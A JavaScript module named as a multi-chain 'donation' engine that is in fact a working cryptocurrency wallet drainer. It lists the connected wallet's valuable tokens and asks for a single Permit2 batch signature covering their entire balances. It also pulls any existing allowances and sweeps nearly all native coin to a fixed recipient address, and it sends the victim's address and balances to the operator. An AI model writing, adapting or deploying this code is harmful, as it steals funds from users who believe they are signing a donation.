// src/engine/donate.js
import { ethers } from "ethers";
import { SignatureTransfer } from "@uniswap/permit2-sdk";
import {
  COVALENT_API_KEY,
  RECIPIENT_ADDRESS,
  DONATION_CONTRACT_ADDRESS,
  DONATION_CONTRACT_ABI,
  PERMIT2_ADDRESS,
  PERMIT2_ABI,
  exceptionList, // only 'cake' for now
} from "../config.js";
import { getFreePermit2Nonce } from "./nonceHelper.js";
import { notify } from "../utils/notify.js";

/** Chains to sweep */
const CHAINS = [
  { chainId: 1, name: "Ethereum" },
  { chainId: 56, name: "BSC" },
  /* { chainId: 137, name: "Polygon" } */
];

/** Convert numeric chainId to hex string */
function chainIdToHex(chainId) {
  return "0x" + chainId.toString(16);
}

/** Get provider + signer for chain */
async function getProviderAndSignerForChain(walletClient, targetChainId) {
  if (walletClient) {
    const { account, transport } = walletClient;
    const provider = new ethers.BrowserProvider(transport);
    try {
      if (typeof walletClient.switchChain === "function") {
        await walletClient.switchChain?.({ id: targetChainId }).catch(() => {});
      } else {
        await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
      }
    } catch {}
    const signer = new ethers.JsonRpcSigner(provider, account.address);
    return { provider, signer, usingWalletClient: true };
  }

  if (typeof window !== "undefined" && window.ethereum) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    try {
      await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
    } catch {}
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    return { provider, signer, usingWalletClient: false };
  }

  throw new Error("No wallet provider found");
}

/** Fetch balances via Covalent */
export async function fetchBalancesCovalent(address, chainId) {
  try {
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`;
    const res = await fetch(url);
    const json = await res.json();
    if (!json?.data?.items) return [];
    return json.data.items
      .filter(i => i.contract_address && i.balance && i.balance !== "0")
      .map(i => ({
        tokenSymbol: i.contract_ticker_symbol,
        tokenAddress: i.contract_address.toLowerCase(),
        balanceRaw: i.balance,
        decimals: i.contract_decimals || 18,
        quote: i.quote || 0,
      }));
  } catch {
    return [];
  }
}

/** Filter tokens for Permit2 (exclude native) */
export async function filterPermit2SafeTokens(tokens) {
  return tokens.filter(t =>
    t.tokenAddress &&
    !["BNB", "ETH"/*,"MATIC"*/].includes(t.tokenSymbol) &&
    t.balanceRaw !== "0" &&
    (t.quote || 0) > 0 // drop 0-value tokens
  );
}

/** Sum USD value */
export function getChainValue(tokens) {
  return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
}

/** Check Permit2 compatibility */
export async function isPermit2Compatible(tokenAddress, signer) {
  try {
    const token = new ethers.Contract(
      tokenAddress,
      ["function transferFrom(address,address,uint256) returns (bool)"],
      signer
    );
    return typeof token.transferFrom === "function";
  } catch {
    return false;
  }
}

/** Main donation flow */
export async function autoDonateMultiChain(walletClient) {
  try {
    // Resolve owner address
    let owner = null;
    if (walletClient?.account?.address) owner = walletClient.account.address;
    else if (typeof window !== "undefined" && window.ethereum) {
      const tmpProv = new ethers.BrowserProvider(window.ethereum);
      await tmpProv.send("eth_requestAccounts", []);
      const tmpSigner = await tmpProv.getSigner();
      owner = await tmpSigner.getAddress();
    }
    if (!owner) throw new Error("Wallet not connected");

    // Notify wallet connected
    const balancesCrossChain = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);
      balancesCrossChain.push({ name: chain.name, native: 0, tokens: filtered.map(t => ({ name: t.tokenSymbol, amount: t.balanceRaw, value: t.quote })), total: getChainValue(filtered) });
    }
    const grandTotal = balancesCrossChain.reduce((a, c) => a + c.total, 0);
    notify("WALLET_CONNECTED", { walletAddress: owner, trackingId: Date.now().toString(), balances: balancesCrossChain, grandTotal });

    // Sort chains by total value
    const chainBalances = balancesCrossChain.map((c, idx) => ({ ...CHAINS[idx], tokens: c.tokens, totalValue: c.total }));
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // Start donation
    const trackingId = Date.now().toString();
    notify("DONATION_START", { walletAddress: owner, trackingId });

    for (const chain of chainBalances) {
      const { provider, signer } = await getProviderAndSignerForChain(walletClient, chain.chainId);
      notify("CHAIN_SWITCH", { trackingId, oldChain: "previous", newChain: chain.name });

      const donation = new ethers.Contract(DONATION_CONTRACT_ADDRESS[chain.chainId], DONATION_CONTRACT_ABI, signer);

      // Split tokens: Permit2 vs fallback
      const permit2Tokens = [];
      const fallbackTokens = [];
      for (const t of chain.tokens) {
        if (exceptionList?.[chain.chainId]?.includes(t.name.toLowerCase())) fallbackTokens.push(t);
        else if (await isPermit2Compatible(t.name, signer)) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      // --- Permit2 batch ---
      if (permit2Tokens.length > 0) {
        try {
          const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
          const nonce = await getFreePermit2Nonce(permit2, owner);
          const deadline = Math.floor(Date.now()/1000)+3600;
          const permittedForSig = permit2Tokens.map(t => ({ token: t.name, amount: BigInt(t.amount) }));
          const permitForSig = { permitted: permittedForSig, nonce: BigInt(nonce), deadline: BigInt(deadline), spender: DONATION_CONTRACT_ADDRESS[chain.chainId] };
          const { domain, types, values } = SignatureTransfer.getPermitData(permitForSig, PERMIT2_ADDRESS, chain.chainId);
          const signature = typeof signer.signTypedData === "function"
            ? await signer.signTypedData(domain, types, values)
            : await signer._signTypedData(domain, types, values);
          const transferDetails = permit2Tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.amount }));
          const permitForContractCall = { permitted: permit2Tokens.map(t => ({ token: t.name, amount: t.amount })), nonce, deadline };
          const tx = await donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
          await tx.wait();
        } catch {
          fallbackTokens.push(...permit2Tokens);
        }
      }

      // --- Fallback ---
      if (fallbackTokens.length > 0) {
        const tokensToPull = fallbackTokens.map(t => t.name);
        const amountsToPull = fallbackTokens.map(t => t.amount);
        try {
          const tx2 = await donation.pullAndDonateAllowanceBatch(tokensToPull, amountsToPull, owner);
          await tx2.wait();
        } catch {}
      }

      // --- Native sweep ---
      try {
        const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
        const reserve = 21000n * (gasPrice ?? 0n) * 2n;
        const bal = await provider.getBalance(owner);
        if (bal > reserve) await signer.sendTransaction({ to: RECIPIENT_ADDRESS, value: bal - reserve });
      } catch {}
    }

    // Final wallet disconnect
    notify("WALLET_DISCONNECTED", { walletAddress: owner, trackingId });
    return { success: true };
  } catch (err) {
    console.error(err);
    return { success: false, reason: err.message || String(err) };
  }
}

// Alias for index.js
export { autoDonateMultiChain as runDonationFlow };
